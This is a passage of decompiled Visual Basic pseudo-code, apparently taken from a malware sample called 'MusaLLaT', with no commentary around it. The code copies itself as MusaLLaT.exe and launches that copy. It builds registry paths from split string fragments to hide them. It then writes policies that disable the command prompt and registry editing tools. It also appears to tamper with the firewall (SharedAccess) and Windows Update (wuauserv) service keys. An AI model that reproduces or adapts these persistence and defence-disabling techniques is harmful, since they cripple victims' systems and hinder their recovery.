  loc_0043C8E2:   var_154 = var_150.UnkVCall_000001ECh
  loc_0043C8EF:   If var_154 < 0 Then
  loc_0043C909:     call var_80A4 = global_00401058(var_154, var_150, global_00418DC4, 000001ECh)
  loc_0043C90F:     var_1A8 = var_80A4
  loc_0043C917:   Else
  loc_0043C921:   End If
  loc_0043C927:   call var_80A8 = global_004011CC
  loc_0043C933:   call var_80AC = global_004011D4
  loc_0043C950:   call var_80B0 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043C977:   call var_80B4 = global_00401078(var_C8, Form1.List1)
  loc_0043C97D:   var_150 = var_80B4
  loc_0043C99C:   ext_40109C
  loc_0043C9E2:   var_154 = var_150.UnkVCall_000001ECh
  loc_0043C9EF:   If var_154 < 0 Then
  loc_0043CA09:     call var_80B8 = global_00401058(var_154, var_150, global_00418DC4, 000001ECh, 10)
  loc_0043CA0F:     var_1AC = var_80B8
  loc_0043CA17:   Else
  loc_0043CA21:   End If
  loc_0043CA27:   call var_80BC = global_004011D4
  loc_0043CA4B:   call var_80C0 = global_00401078(var_C8, Form1.Timer11)
  loc_0043CA51:   var_150 = var_80C0
  loc_0043CA68:   var_150.UnkVCall_0000005Ch
  loc_0043CA6D:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043CA7A:   If var_154 < 0 Then
  loc_0043CA91:     call var_80C4 = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043CA97:     var_1B0 = var_80C4
  loc_0043CA9F:   Else
  loc_0043CAA9:   End If
  loc_0043CAAF:   call var_80C8 = global_004011D4
  loc_0043CAD3:   call var_80CC = global_00401078(var_C8, Form1.Timer2)
  loc_0043CAD9:   var_150 = var_80CC
  loc_0043CAF0:   var_150.UnkVCall_0000005Ch
  loc_0043CAF5:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043CB02:   If var_154 < 0 Then
  loc_0043CB19:     call var_80D0 = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043CB1F:     var_1B4 = var_80D0
  loc_0043CB27:   Else
  loc_0043CB31:   End If
  loc_0043CB37:   call var_80D4 = global_004011D4
  loc_0043CB5B:   call var_80D8 = global_00401078(var_C8, Form1.Timer7)
  loc_0043CB61:   var_150 = var_80D8
  loc_0043CB78:   var_150.UnkVCall_0000005Ch
  loc_0043CB7D:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043CB8A:   If var_154 < 0 Then
  loc_0043CBA1:     call var_80DC = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043CBA7:     var_1B8 = var_80DC
  loc_0043CBAF:   Else
  loc_0043CBB9:   End If
  loc_0043CBBF:   call var_80E0 = global_004011D4
  loc_0043CBE3:   call var_80E4 = global_00401078(var_C8, Form1.Timer6)
  loc_0043CBE9:   var_150 = var_80E4
  loc_0043CC00:   var_150.UnkVCall_0000005Ch
  loc_0043CC05:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043CC12:   If var_154 < 0 Then
  loc_0043CC29:     call var_80E8 = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043CC2F:     var_1BC = var_80E8
  loc_0043CC37:   Else
  loc_0043CC41:   End If
  loc_0043CC47:   call var_80EC = global_004011D4
  loc_0043CC6B:   call var_80F0 = global_00401078(var_C8, Form1.Timer5)
  loc_0043CC71:   var_150 = var_80F0
  loc_0043CC88:   var_150.UnkVCall_0000005Ch
  loc_0043CC8D:   var_154 = var_150.UnkVCall_0000005Ch
  loc_0043CC9A:   If var_154 < 0 Then
  loc_0043CCB1:     call var_80F4 = global_00401058(var_154, var_150, global_0041925C, 0000005Ch, var_150, FFFFFFFFh)
  loc_0043CCB7:     var_1C0 = var_80F4
  loc_0043CCBF:   Else
  loc_0043CCC9:   End If
  loc_0043CCCF:   call var_80F8 = global_004011D4
  loc_0043CCDA: Else
  loc_0043CCE8:   If global_00460558 = 0 Then
  loc_0043CCF4:     call var_80FC = global_00401134(global_00418EE0, global_00460558)
  loc_0043CCFA:     var_1C4 = global_00460558
  loc_0043CD06:   Else
  loc_0043CD10:   End If
  loc_0043CD18:   var_150 = var_1C4
  loc_0043CD34:   var_C8 = var_150.UnkVCall_00000014h
  loc_0043CD39:   var_154 = var_C8
  loc_0043CD46:   If var_154 < 0 Then
  loc_0043CD5D:     call var_8100 = global_00401058(var_154, var_150, global_00418ED0, 00000014h)
  loc_0043CD63:     var_1C8 = var_8100
  loc_0043CD6B:   Else
  loc_0043CD75:   End If
  loc_0043CD7B:   var_158 = var_C8
  loc_0043CD97:   var_A4 = var_158.UnkVCall_00000050h
  loc_0043CD9C:   var_15C = var_A4
  loc_0043CDA9:   If var_15C < 0 Then
  loc_0043CDC0:     call var_8104 = global_00401058(var_15C, var_158, global_00418EF0, 00000050h)
  loc_0043CDC6:     var_1CC = var_8104
  loc_0043CDCE:   Else
  loc_0043CDD8:   End If
  loc_0043CDDF:   If global_00460558 = 0 Then
  loc_0043CDEB:     call var_8108 = global_00401134(global_00418EE0, global_00460558)
  loc_0043CDF1:     var_1D0 = global_00460558
  loc_0043CDFD:   Else
  loc_0043CE07:   End If
  loc_0043CE0F:   var_160 = var_1D0
  loc_0043CE2B:   var_CC = var_160.UnkVCall_00000014h
  loc_0043CE30:   var_164 = var_CC
  loc_0043CE3D:   If var_164 < 0 Then
  loc_0043CE54:     call var_810C = global_00401058(var_164, var_160, global_00418ED0, 00000014h)
  loc_0043CE5A:     var_1D4 = var_810C
  loc_0043CE62:   Else
  loc_0043CE6C:   End If
  loc_0043CE72:   var_168 = var_CC
  loc_0043CE8E:   var_A8 = var_168.UnkVCall_00000058h
  loc_0043CE93:   var_16C = var_A8
  loc_0043CEA0:   If var_16C < 0 Then
  loc_0043CEB7:     call var_8110 = global_00401058(var_16C, var_168, global_00418EF0, 00000058h)
  loc_0043CEBD:     var_1D8 = var_8110
  loc_0043CEC5:   Else
  loc_0043CECF:   End If
  loc_0043CED6:   call var_8114 = global_00401018(var_A4)
  loc_0043CEF2:   call var_8118 = global_004010B0("MusaLLaT", var_A8)
  loc_0043CF19:   call var_811C = global_00401150(00000002h, var_A4, var_A8)
  loc_0043CF32:   call var_8120 = global_0040102C(00000002h, var_C8, var_CC)
  loc_0043CF44:   If var_8118 + 1 Then
  loc_0043CF61:     var_144 = global_00460558.hWnd
  loc_0043CF66:     var_150 = var_144
  loc_0043CF73:     If var_150 < 0 Then
  loc_0043CF87:       call var_8124 = global_00401058(var_150, Me, global_00418904, 00000058h)
  loc_0043CF8D:       var_1DC = var_8124
  loc_0043CF95:     Else
  loc_0043CF9F:     End If
  loc_0043CFA6:     If global_00460558 = 0 Then
  loc_0043CFB2:       call var_8128 = global_00401134(global_00418EE0, global_00460558)
  loc_0043CFB8:       var_1E0 = global_00460558
  loc_0043CFC4:     Else
  loc_0043CFCE:     End If
  loc_0043CFD6:     var_154 = var_1E0
  loc_0043CFF2:     var_C8 = var_154.UnkVCall_00000014h
  loc_0043CFF7:     var_158 = var_C8
  loc_0043D004:     If var_158 < 0 Then
  loc_0043D01B:       call var_812C = global_00401058(var_158, var_154, global_00418ED0, 00000014h)
  loc_0043D021:       var_1E4 = var_812C
  loc_0043D029:     Else
  loc_0043D033:     End If
  loc_0043D039:     var_15C = var_C8
  loc_0043D055:     var_A4 = var_15C.UnkVCall_00000050h
  loc_0043D05A:     var_160 = var_A4
  loc_0043D067:     If var_160 < 0 Then
  loc_0043D07E:       call var_8130 = global_00401058(var_160, var_15C, global_00418EF0, 00000050h)
  loc_0043D084:       var_1E8 = var_8130
  loc_0043D08C:     Else
  loc_0043D096:     End If
  loc_0043D0AA:     call var_8134 = global_00401188(var_AC, var_A4, 00000000h, 00000000h, 00000001h)
  loc_0043D0BD:     call var_8138 = global_00401188(var_A8, "open", var_8134)
  loc_0043D0CB:     var_813C = ShellExecute(var_144, var_8138, , , , )
  loc_0043D0D0:     call var_8140 = global_00401054
  loc_0043D0ED:     call var_8144 = global_00401150(00000003h, var_A8, var_A4, var_AC)
  loc_0043D0FC:     call var_8148 = global_004011D4
  loc_0043D110:     If global_00460558 = 0 Then
  loc_0043D11C:       call var_814C = global_00401134(global_00418EE0, global_00460558)
  loc_0043D122:       var_1EC = global_00460558
  loc_0043D12E:     Else
  loc_0043D138:     End If
  loc_0043D140:     var_150 = var_1EC
  loc_0043D15C:     var_C8 = var_150.UnkVCall_00000014h
  loc_0043D161:     var_154 = var_C8
  loc_0043D16E:     If var_154 < 0 Then
  loc_0043D185:       call var_8150 = global_00401058(var_154, var_150, global_00418ED0, 00000014h)
  loc_0043D18B:       var_1F0 = var_8150
  loc_0043D193:     Else
  loc_0043D19D:     End If
  loc_0043D1A3:     var_158 = var_C8
  loc_0043D1BF:     var_A4 = var_158.UnkVCall_00000050h
  loc_0043D1C4:     var_15C = var_A4
  loc_0043D1D1:     If var_15C < 0 Then
  loc_0043D1E8:       call var_8154 = global_00401058(var_15C, var_158, global_00418EF0, 00000050h)
  loc_0043D1EE:       var_1F4 = var_8154
  loc_0043D1F6:     Else
  loc_0043D200:     End If
  loc_0043D207:     If global_00460558 = 0 Then
  loc_0043D213:       call var_8158 = global_00401134(global_00418EE0, global_00460558)
  loc_0043D219:       var_1F8 = global_00460558
  loc_0043D225:     Else
  loc_0043D22F:     End If
  loc_0043D237:     var_160 = var_1F8
  loc_0043D253:     var_CC = var_160.UnkVCall_00000014h
  loc_0043D258:     var_164 = var_CC
  loc_0043D265:     If var_164 < 0 Then
  loc_0043D27C:       call var_815C = global_00401058(var_164, var_160, global_00418ED0, 00000014h)
  loc_0043D282:       var_1FC = var_815C
  loc_0043D28A:     Else
  loc_0043D294:     End If
  loc_0043D29A:     var_168 = var_CC
  loc_0043D2B6:     var_A8 = var_168.UnkVCall_00000058h
  loc_0043D2BB:     var_16C = var_A8
  loc_0043D2C8:     If var_16C < 0 Then
  loc_0043D2DF:       call var_8160 = global_00401058(var_16C, var_168, global_00418EF0, 00000058h)
  loc_0043D2E5:       var_200 = var_8160
  loc_0043D2ED:     Else
  loc_0043D2F7:     End If
  loc_0043D301:     call var_8164 = global_00401044(global_00419240, global_00419238)
  loc_0043D30F:     call var_8168 = global_004011AC
  loc_0043D31B:     call var_816C = global_00401044(global_00419240, var_8168)
  loc_0043D329:     call var_8170 = global_004011AC
  loc_0043D335:     call var_8174 = global_00401044("da", var_8170)
  loc_0043D343:     call var_8178 = global_004011AC
  loc_0043D34F:     call var_817C = global_00401044("ta", var_8178)
  loc_0043D355:     var_D4 = var_817C
  loc_0043D373:     call var_8180 = global_00401064(var_EC, var_DC)
  loc_0043D379:     var_114 = "\MusaLLaT.exe"
  loc_0043D3A2:     call var_8184 = global_00401180(var_FC, 8, var_EC)
  loc_0043D3B0:     call var_8188 = global_00401118(var_C4, var_8184)
  loc_0043D3C3:     call var_818C = global_00401044("\", var_A4, var_8188)
  loc_0043D3D1:     call var_8190 = global_004011AC
  loc_0043D3DF:     call var_8194 = global_00401044(var_A8, var_8190)
  loc_0043D3ED:     call var_8198 = global_004011AC
  loc_0043D3F9:     call var_819C = global_00401044(".exe", var_8198)
  loc_0043D407:     call var_81A0 = global_004011AC
  loc_0043D40E:     call var_81A4 = global_00401158(var_81A0)
  loc_0043D455:     call var_81A8 = global_00401150(00000009h, var_A4, var_AC, var_A8, var_B0, var_B4, var_B8, var_BC, var_C0, var_C4)
  loc_0043D46E:     call var_81AC = global_0040102C(00000002h, var_C8, var_CC)
  loc_0043D48E:     call var_81B0 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043D4A8:     call var_81B4 = global_00401044(global_00419240, global_00419238)
  loc_0043D4B6:     call var_81B8 = global_004011AC
  loc_0043D4C2:     call var_81BC = global_00401044(global_00419240, var_81B8)
  loc_0043D4D0:     call var_81C0 = global_004011AC
  loc_0043D4DC:     call var_81C4 = global_00401044("da", var_81C0)
  loc_0043D4EA:     call var_81C8 = global_004011AC
  loc_0043D4F6:     call var_81CC = global_00401044("ta", var_81C8)
  loc_0043D4FC:     var_D4 = var_81CC
  loc_0043D51A:     call var_81D0 = global_00401064(var_EC, var_DC)
  loc_0043D520:     var_114 = "\MusaLLaT.exe"
  loc_0043D54B:     call var_81D4 = global_00401180(var_FC, 8, var_EC, 00000006h)
  loc_0043D559:     call var_81D8 = global_00401118(var_B0, var_81D4)
  loc_0043D560:     call var_81DC = global_004011D0(var_81D8)
  loc_0043D584:     call var_81E0 = global_00401150(00000004h, var_A4, var_A8, var_AC, var_B0)
  loc_0043D5A4:     call var_81E4 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043D5BE:     call var_81E8 = global_00401044(global_00419240, global_00419238)
  loc_0043D5CC:     call var_81EC = global_004011AC
  loc_0043D5D8:     call var_81F0 = global_00401044(global_00419240, var_81EC)
  loc_0043D5E6:     call var_81F4 = global_004011AC
  loc_0043D5F2:     call var_81F8 = global_00401044("da", var_81F4)
  loc_0043D600:     call var_81FC = global_004011AC
  loc_0043D60C:     call var_8200 = global_00401044("ta", var_81FC)
  loc_0043D612:     var_D4 = var_8200
  loc_0043D630:     call var_8204 = global_00401064(var_EC, var_DC)
  loc_0043D636:     var_114 = "\MusaLLaT.exe"
  loc_0043D661:     call var_8208 = global_00401180(var_FC, 8, var_EC, 00000002h)
  loc_0043D668:     call var_820C = global_004010DC(var_8208)
  loc_0043D66E:     var_14C = var_820C
  loc_0043D68B:     call var_8210 = global_00401150(00000003h, var_A4, var_A8, var_AC)
  loc_0043D6AB:     call var_8214 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043D6BB:     call var_8218 = global_00401020
  loc_0043D6C6:   Else
  loc_0043D6D4:     If global_00460558 = 0 Then
  loc_0043D6E0:       call var_821C = global_00401134(global_00418EE0, global_00460558)
  loc_0043D6E6:       var_204 = global_00460558
  loc_0043D6F2:     Else
  loc_0043D6FC:     End If
  loc_0043D704:     var_150 = var_204
  loc_0043D720:     var_C8 = var_150.UnkVCall_00000014h
  loc_0043D725:     var_154 = var_C8
  loc_0043D732:     If var_154 < 0 Then
  loc_0043D749:       call var_8220 = global_00401058(var_154, var_150, global_00418ED0, 00000014h)
  loc_0043D74F:       var_208 = var_8220
  loc_0043D757:     Else
  loc_0043D761:     End If
  loc_0043D767:     var_158 = var_C8
  loc_0043D783:     var_A4 = var_158.UnkVCall_00000050h
  loc_0043D788:     var_15C = var_A4
  loc_0043D795:     If var_15C < 0 Then
  loc_0043D7AC:       call var_8224 = global_00401058(var_15C, var_158, global_00418EF0, 00000050h)
  loc_0043D7B2:       var_20C = var_8224
  loc_0043D7BA:     Else
  loc_0043D7C4:     End If
  loc_0043D7CB:     If global_00460558 = 0 Then
  loc_0043D7D7:       call var_8228 = global_00401134(global_00418EE0, global_00460558)
  loc_0043D7DD:       var_210 = global_00460558
  loc_0043D7E9:     Else
  loc_0043D7F3:     End If
  loc_0043D7FB:     var_160 = var_210
  loc_0043D817:     var_CC = var_160.UnkVCall_00000014h
  loc_0043D81C:     var_164 = var_CC
  loc_0043D829:     If var_164 < 0 Then
  loc_0043D840:       call var_822C = global_00401058(var_164, var_160, global_00418ED0, 00000014h)
  loc_0043D846:       var_214 = var_822C
  loc_0043D84E:     Else
  loc_0043D858:     End If
  loc_0043D85E:     var_168 = var_CC
  loc_0043D87A:     var_A8 = var_168.UnkVCall_00000058h
  loc_0043D87F:     var_16C = var_A8
  loc_0043D88C:     If var_16C < 0 Then
  loc_0043D8A3:       call var_8230 = global_00401058(var_16C, var_168, global_00418EF0, 00000058h)
  loc_0043D8A9:       var_218 = var_8230
  loc_0043D8B1:     Else
  loc_0043D8BB:     End If
  loc_0043D8C5:     call var_8234 = global_00401044(global_00419240, global_00419238)
  loc_0043D8D3:     call var_8238 = global_004011AC
  loc_0043D8DF:     call var_823C = global_00401044(global_00419240, var_8238)
  loc_0043D8ED:     call var_8240 = global_004011AC
  loc_0043D8F9:     call var_8244 = global_00401044("da", var_8240)
  loc_0043D907:     call var_8248 = global_004011AC
  loc_0043D913:     call var_824C = global_00401044("ta", var_8248)
  loc_0043D919:     var_D4 = var_824C
  loc_0043D937:     call var_8250 = global_00401064(var_EC, var_DC)
  loc_0043D93D:     var_114 = "\MusaLLaT.exe"
  loc_0043D966:     call var_8254 = global_00401180(var_FC, 8, var_EC)
  loc_0043D974:     call var_8258 = global_00401118(var_C4, var_8254)
  loc_0043D987:     call var_825C = global_00401044("\", var_A4, var_8258)
  loc_0043D995:     call var_8260 = global_004011AC
  loc_0043D9A3:     call var_8264 = global_00401044(var_A8, var_8260)
  loc_0043D9B1:     call var_8268 = global_004011AC
  loc_0043D9BD:     call var_826C = global_00401044(".exe", var_8268)
  loc_0043D9CB:     call var_8270 = global_004011AC
  loc_0043D9D2:     call var_8274 = global_00401158(var_8270)
  loc_0043DA19:     call var_8278 = global_00401150(00000009h, var_A4, var_AC, var_A8, var_B0, var_B4, var_B8, var_BC, var_C0, var_C4)
  loc_0043DA32:     call var_827C = global_0040102C(00000002h, var_C8, var_CC)
  loc_0043DA52:     call var_8280 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043DA6C:     call var_8284 = global_00401044(global_00419240, global_00419238)
  loc_0043DA7A:     call var_8288 = global_004011AC
  loc_0043DA86:     call var_828C = global_00401044(global_00419240, var_8288)
  loc_0043DA94:     call var_8290 = global_004011AC
  loc_0043DAA0:     call var_8294 = global_00401044("da", var_8290)
  loc_0043DAAE:     call var_8298 = global_004011AC
  loc_0043DABA:     call var_829C = global_00401044("ta", var_8298)
  loc_0043DAC0:     var_D4 = var_829C
  loc_0043DADE:     call var_82A0 = global_00401064(var_EC, var_DC)
  loc_0043DAE4:     var_114 = "\MusaLLaT.exe"
  loc_0043DB0F:     call var_82A4 = global_00401180(var_FC, 8, var_EC, 00000006h)
  loc_0043DB1D:     call var_82A8 = global_00401118(var_B0, var_82A4)
  loc_0043DB24:     call var_82AC = global_004011D0(var_82A8)
  loc_0043DB48:     call var_82B0 = global_00401150(00000004h, var_A4, var_A8, var_AC, var_B0)
  loc_0043DB68:     call var_82B4 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043DB82:     call var_82B8 = global_00401044(global_00419240, global_00419238)
  loc_0043DB90:     call var_82BC = global_004011AC
  loc_0043DB9C:     call var_82C0 = global_00401044(global_00419240, var_82BC)
  loc_0043DBAA:     call var_82C4 = global_004011AC
  loc_0043DBB6:     call var_82C8 = global_00401044("da", var_82C4)
  loc_0043DBC4:     call var_82CC = global_004011AC
  loc_0043DBD0:     call var_82D0 = global_00401044("ta", var_82CC)
  loc_0043DBD6:     var_D4 = var_82D0
  loc_0043DBF4:     call var_82D4 = global_00401064(var_EC, var_DC)
  loc_0043DBFA:     var_114 = "\MusaLLaT.exe"
  loc_0043DC25:     call var_82D8 = global_00401180(var_FC, 8, var_EC, 00000002h)
  loc_0043DC2C:     call var_82DC = global_004010DC(var_82D8)
  loc_0043DC32:     var_14C = var_82DC
  loc_0043DC4F:     call var_82E0 = global_00401150(00000003h, var_A4, var_A8, var_AC)
  loc_0043DC6F:     call var_82E4 = global_00401024(00000003h, var_DC, var_EC, var_FC)
  loc_0043DC7F:     call var_82E8 = global_00401020
  loc_0043DC85:   End If
  loc_0043DC85: End If
  loc_0043DC92: GoTo loc_0043DD22
  loc_0043DCD8: call var_82EC = global_00401150(00000009h, var_A4, var_A8, var_AC, var_B0, var_B4, var_B8, var_BC, var_C0, var_C4, global_0043DD71)
  loc_0043DCF1: call var_82F0 = global_0040102C(00000002h, var_C8, var_CC)
  loc_0043DD18: call var_82F4 = global_00401024(00000004h, var_DC, var_EC, var_FC, var_10C)
  loc_0043DD21: Exit Sub
  loc_0043DD22: ' Referenced from: 0043DC92
  loc_0043DD25: call var_82F8 = global_00401014
  loc_0043DD2E: call var_82FC = global_00401014
  loc_0043DD37: call var_8300 = global_00401014
  loc_0043DD40: call var_8304 = global_00401014
  loc_0043DD49: call var_8308 = global_00401014
  loc_0043DD52: call var_830C = global_00401014
  loc_0043DD5E: call var_8310 = global_00401014
  loc_0043DD6A: call var_8314 = global_00401014
End Sub

Private Sub Timer9_Timer() '459EF0
  loc_00459EF6: ext_4010EC
  loc_00459F0E: ext_40109C
  loc_00459F55: call var_8004 = global_00401070(FFFFFFFFh, Me, 0, 0, 0)
  loc_00459F6E: call var_8008 = global_00401044("cri", "Ws", 00000000h)
  loc_00459F79: call var_800C = global_004011AC
  loc_00459F85: call var_8010 = global_00401044("pt.s", var_800C)
  loc_00459F90: call var_8014 = global_004011AC
  loc_00459F9C: call var_8018 = global_00401044("he", var_8014)
  loc_00459FA7: call var_801C = global_004011AC
  loc_00459FB3: call var_8020 = global_00401044("ll", var_801C)
  loc_00459FBE: call var_8024 = global_004011AC
  loc_00459FCC: call var_8028 = global_00401108(var_98, var_8024)
  loc_00459FDD: call var_802C = global_0040116C(var_30, var_98)
  loc_00459FF5: call var_8030 = global_00401150(00000004h, var_34, var_38, var_3C, var_40)
  loc_0045A00F: call var_8034 = global_00401044("Y_CU", "HKE")
  loc_0045A01A: call var_8038 = global_004011AC
  loc_0045A026: call var_803C = global_00401044("RRE", var_8038)
  loc_0045A031: call var_8040 = global_004011AC
  loc_0045A03D: call var_8044 = global_00401044("NT_USER\Sof", var_8040)
  loc_0045A048: call var_8048 = global_004011AC
  loc_0045A054: call var_804C = global_00401044("tware\Po", var_8048)
  loc_0045A05F: call var_8050 = global_004011AC
  loc_0045A06B: call var_8054 = global_00401044("licies\Mic", var_8050)
  loc_0045A076: call var_8058 = global_004011AC
  loc_0045A082: call var_805C = global_00401044("ros", var_8058)
  loc_0045A08D: call var_8060 = global_004011AC
  loc_0045A099: call var_8064 = global_00401044("oft\W", var_8060)
  loc_0045A0A4: call var_8068 = global_004011AC
  loc_0045A0B0: call var_806C = global_00401044("indows\S", var_8068)
  loc_0045A0BB: call var_8070 = global_004011AC
  loc_0045A0C7: call var_8074 = global_00401044("ys", var_8070)
  loc_0045A0D2: call var_8078 = global_004011AC
  loc_0045A0DE: call var_807C = global_00401044("tem\Di", var_8078)
  loc_0045A0E9: call var_8080 = global_004011AC
  loc_0045A0F5: call var_8084 = global_00401044("sab", var_8080)
  loc_0045A100: call var_8088 = global_004011AC
  loc_0045A10C: call var_808C = global_00401044("le", var_8088)
  loc_0045A117: call var_8090 = global_004011AC
  loc_0045A123: call var_8094 = global_00401044(global_00438334, var_8090)
  loc_0045A12E: call var_8098 = global_004011AC
  loc_0045A13A: call var_809C = global_00401044("MD", var_8098)
  loc_0045A140: var_90 = var_809C
  loc_0045A150: var_C0 = global_00437984
  loc_0045A164: var_E0 = "REG_DWORD"
  loc_0045A17D: ext_40109C
  loc_0045A1AC: ext_40109C
  loc_0045A1DB: ext_40109C
  loc_0045A210: call var_80A0 = global_004010C0(var_30, "RegWrite", 00000003h, 8)
  loc_0045A217: call var_80A4 = global_00401184
  loc_0045A256: call var_80A8 = global_00401150(0000000Dh, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60, var_64)
  loc_0045A265: call var_80AC = global_00401014
  loc_0045A27C: call var_80B0 = global_00401044("EY_C", "HK")
  loc_0045A287: call var_80B4 = global_004011AC
  loc_0045A293: call var_80B8 = global_00401044("URR", var_80B4)
  loc_0045A29E: call var_80BC = global_004011AC
  loc_0045A2AA: call var_80C0 = global_00401044("ENT_U", var_80BC)
  loc_0045A2B5: call var_80C4 = global_004011AC
  loc_0045A2C1: call var_80C8 = global_00401044("SE", var_80C4)
  loc_0045A2CC: call var_80CC = global_004011AC
  loc_0045A2D8: call var_80D0 = global_00401044("R\S", var_80CC)
  loc_0045A2E3: call var_80D4 = global_004011AC
  loc_0045A2EF: call var_80D8 = global_00401044("OFT", var_80D4)
  loc_0045A2FA: call var_80DC = global_004011AC
  loc_0045A306: call var_80E0 = global_00401044("WARE\Mic", var_80DC)
  loc_0045A311: call var_80E4 = global_004011AC
  loc_0045A31D: call var_80E8 = global_00401044("rosoft", var_80E4)
  loc_0045A328: call var_80EC = global_004011AC
  loc_0045A334: call var_80F0 = global_00401044("\Win", var_80EC)
  loc_0045A33F: call var_80F4 = global_004011AC
  loc_0045A34B: call var_80F8 = global_00401044("dows\Curre", var_80F4)
  loc_0045A356: call var_80FC = global_004011AC
  loc_0045A362: call var_8100 = global_00401044("ntVers", var_80FC)
  loc_0045A36D: call var_8104 = global_004011AC
  loc_0045A379: call var_8108 = global_00401044("ion\Poli", var_8104)
  loc_0045A384: call var_810C = global_004011AC
  loc_0045A390: call var_8110 = global_00401044("cies\Sy", var_810C)
  loc_0045A39B: call var_8114 = global_004011AC
  loc_0045A3A7: call var_8118 = global_00401044("stem\Dis", var_8114)
  loc_0045A3B2: call var_811C = global_004011AC
  loc_0045A3BE: call var_8120 = global_00401044("abl", var_811C)
  loc_0045A3C9: call var_8124 = global_004011AC
  loc_0045A3D5: call var_8128 = global_00401044("eRe", var_8124)
  loc_0045A3E0: call var_812C = global_004011AC
  loc_0045A3EC: call var_8130 = global_00401044("gis", var_812C)
  loc_0045A3F7: call var_8134 = global_004011AC
  loc_0045A403: call var_8138 = global_00401044("try", var_8134)
  loc_0045A40E: call var_813C = global_004011AC
  loc_0045A41A: call var_8140 = global_00401044("To", var_813C)
  loc_0045A425: call var_8144 = global_004011AC
  loc_0045A431: call var_8148 = global_00401044("ol", var_8144)
  loc_0045A43C: call var_814C = global_004011AC
  loc_0045A448: call var_8150 = global_00401044("s", var_814C)
  loc_0045A44E: var_90 = var_8150
  loc_0045A45E: var_C0 = global_00437984
  loc_0045A47C: call var_8154 = global_00401044("G_D", "RE")
  loc_0045A48A: call var_8158 = global_004011AC
  loc_0045A496: call var_815C = global_00401044("WO", var_8158)
  loc_0045A4A4: call var_8160 = global_004011AC
  loc_0045A4B0: call var_8164 = global_00401044("RD", var_8160)
  loc_0045A4B6: var_A0 = var_8164
  loc_0045A4CB: ext_40109C
  loc_0045A4FA: ext_40109C
  loc_0045A529: ext_40109C
  loc_0045A55E: call var_8168 = global_004010C0(var_30, "RegWrite", 00000003h, var_A8)
  loc_0045A565: call var_816C = global_00401184
  loc_0045A5CE: call var_8170 = global_00401150(00000016h, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_60, var_64, var_68, var_6C)
  loc_0045A5E7: call var_8174 = global_00401024(00000002h, var_98, var_A8)
  loc_0045A5FF: call var_8178 = global_00401148
  loc_0045A60D: call var_817C = global_00401148
  loc_0045A61D: call var_8180 = global_00401044("STEM\Cu", "SY")
  loc_0045A628: call var_8184 = global_004011AC
  loc_0045A634: call var_8188 = global_00401044("rren", var_8184)
  loc_0045A63F: call var_818C = global_004011AC
  loc_0045A64B: call var_8190 = global_00401044("tCont", var_818C)
  loc_0045A656: call var_8194 = global_004011AC
  loc_0045A662: call var_8198 = global_00401044("rolSet\Se", var_8194)
  loc_0045A66D: call var_819C = global_004011AC
  loc_0045A679: call var_81A0 = global_00401044("rvice", var_819C)
  loc_0045A684: call var_81A4 = global_004011AC
  loc_0045A690: call var_81A8 = global_00401044("s\Sha", var_81A4)
  loc_0045A69B: call var_81AC = global_004011AC
  loc_0045A6A7: call var_81B0 = global_00401044("redA", var_81AC)
  loc_0045A6B2: call var_81B4 = global_004011AC
  loc_0045A6BE: call var_81B8 = global_00401044("cce", var_81B4)
  loc_0045A6C9: call var_81BC = global_004011AC
  loc_0045A6D5: call var_81C0 = global_00401044("ss", var_81BC)
  loc_0045A6E0: call var_81C4 = global_004011AC
  loc_0045A703: var_81C8 = Proc_1_0_45B780(80000002h, var_54, var_58)
  loc_0045A736: call var_81CC = global_00401150(0000000Bh, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_54, var_58, var_5C, var_5C)
  loc_0045A74E: call var_81D0 = global_00401148
  loc_0045A75C: call var_81D4 = global_00401148
  loc_0045A76C: call var_81D8 = global_00401044("ontrolS", "SYSTEM\CurrentC")
  loc_0045A777: call var_81DC = global_004011AC
  loc_0045A783: call var_81E0 = global_00401044("et\Ser", var_81DC)
  loc_0045A78E: call var_81E4 = global_004011AC
  loc_0045A79A: call var_81E8 = global_00401044("vi", var_81E4)
  loc_0045A7A5: call var_81EC = global_004011AC
  loc_0045A7B1: call var_81F0 = global_00401044("ces\wu", var_81EC)
  loc_0045A7BC: call var_81F4 = global_004011AC
  loc_0045A7C8: call var_81F8 = global_00401044("aus", var_81F4)
  loc_0045A7D3: call var_81FC = global_004011AC
  loc_0045A7DF: call var_8200 = global_00401044("erv", var_81FC)
  loc_0045A7EA: call var_8204 = global_004011AC
  loc_0045A80D: var_8208 = Proc_1_0_45B780(80000002h, var_48, var_4C)
  loc_0045A834: call var_820C = global_00401150(00000008h, var_34, var_38, var_3C, var_40, var_44, var_48, var_4C, var_50, var_50)
  loc_0045A84C: call var_8210 = global_00401148
  loc_0045A85A: call var_8214 = global_00401148
  loc_0045A868: call var_8218 = global_00401148
  loc_0045A88B: var_821C = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045A89E: call var_8220 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045A8B6: call var_8224 = global_00401148
  loc_0045A8C4: call var_8228 = global_00401148
  loc_0045A8D2: call var_822C = global_00401148
  loc_0045A8F5: var_8230 = Proc_1_0_45B780(80000002h, var_34, var_38)
  loc_0045A908: call var_8234 = global_00401150(00000003h, var_34, var_38, var_3C, var_3C)
  loc_0045A920: call var_8238 = global_00401148
  loc_0045A92E: call var_823C = global_00401148
  loc_0045A93C: call var_8240 = global_00401148
